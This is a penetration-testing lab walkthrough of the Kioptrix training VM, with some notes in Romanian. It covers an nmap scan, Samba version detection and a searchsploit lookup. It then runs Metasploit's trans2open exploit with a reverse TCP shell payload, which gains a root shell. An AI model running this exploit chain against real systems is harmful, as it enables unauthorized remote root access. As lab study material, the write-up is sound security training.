# 1. Nmap:
![](../../attachments/Pasted%20image%2020261007121647.png)
```
┌──(paius㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 192.168.123.10

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 08:17 -0400
Nmap scan report for kioptrix (192.168.123.10)
Host is up (0.00024s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: NMYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_ssl-date: 2026-10-07T16:18:02+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 52:54:00:12:34:10 (QEMU virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 3h59m58s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.24 ms kioptrix (192.168.123.10)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds
```
![](../../attachments/Pasted%20image%2020261007122009.png)

# 2. Metasploit:
```
┌──(paius㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Enable HTTP request and response logging with set HttpTrace 
true
                                                  
# cowsay++
 ____________                                                                                                                                               
< metasploit >                                                                                                                                              
 ------------                                                                                                                                               
       \   ,__,                                                                                                                                             
        \  (oo)____                                                                                                                                         
           (__)    )\                                                                                                                                       
              ||--|| *                                                                                                                                      
                                                                                                                                                            

       =[ metasploit v6.5.3-dev                                 ]
+ -- --=[ 2,684 exploits - 1,352 auxiliary - 2,604 payloads     ]
+ -- --=[ 436 post - 57 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search smb_version

Matching Modules
================

   #  Full Name                          Disclosure Date  Rank    Check  Name
   -  ---------                          ---------------  ----    -----  ----
   0  auxiliary/scanner/smb/smb_version  .                normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf > use 0
msf auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.123.10
RHOSTS => 192.168.123.10
msf auxiliary(scanner/smb/smb_version) > set RPORT 139
RPORT => 139
msf auxiliary(scanner/smb/smb_version) > set VERBOSE true
VERBOSE => true
msf auxiliary(scanner/smb/smb_version) > run
[*] 192.168.123.10:139    - Force SMB1 since SMB fingerprint needs native_lm/native_os information
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.35/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.123.10:139    - SMB Detected (versions: ) (preferred dialect: ) (signatures: optional)
[+] 192.168.123.10:139    -   Host is running Unix
[*] 192.168.123.10:139    -   Samba 2.2.1a
[*] 192.168.123.10:139    -   SMB signing is not required
[*] 192.168.123.10        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Astfel, versiunea SMB-ului de pe kioptrix este: **Samba 2.2.1a**.


# 3. Searchsploit:

```
┌──(paius㉿kali)-[~]
└─$ searchsploit Samba 2.2.1a
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                    | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                               | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                                           | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                   | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

# 4. Exploiting Samba using metasploit

```
msf > use exploit/linux/samba/trans2open
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.122.210  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > set LHOST 192.168.123.103
LHOST => 192.168.123.103
msf exploit(linux/samba/trans2open) > set RHOSTS 192.168.123.10
RHOSTS => 192.168.123.10

msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 192.168.123.103:4444 
[*] 192.168.123.10:139 - Trying return address 0xbffffdfc...
[*] 192.168.123.10:139 - Trying return address 0xbffffcfc...
[*] 192.168.123.10:139 - Trying return address 0xbffffbfc...
[*] 192.168.123.10:139 - Trying return address 0xbffffafc...
[*] 192.168.123.10:139 - Trying return address 0xbffff9fc...
[*] 192.168.123.10:139 - Trying return address 0xbffff8fc...
[*] 192.168.123.10:139 - Trying return address 0xbffff7fc...
[*] 192.168.123.10:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.123.103:4444 -> 192.168.123.10:32825) at 2026-10-07 08:51:24 -0400

[*] Command shell session 6 opened (192.168.123.103:4444 -> 192.168.123.10:32826) at 2026-10-07 08:51:26 -0400
[*] Command shell session 7 opened (192.168.123.103:4444 -> 192.168.123.10:32827) at 2026-10-07 08:51:27 -0400
[*] Command shell session 8 opened (192.168.123.103:4444 -> 192.168.123.10:32828) at 2026-10-07 08:51:28 -0400
whoami
root
```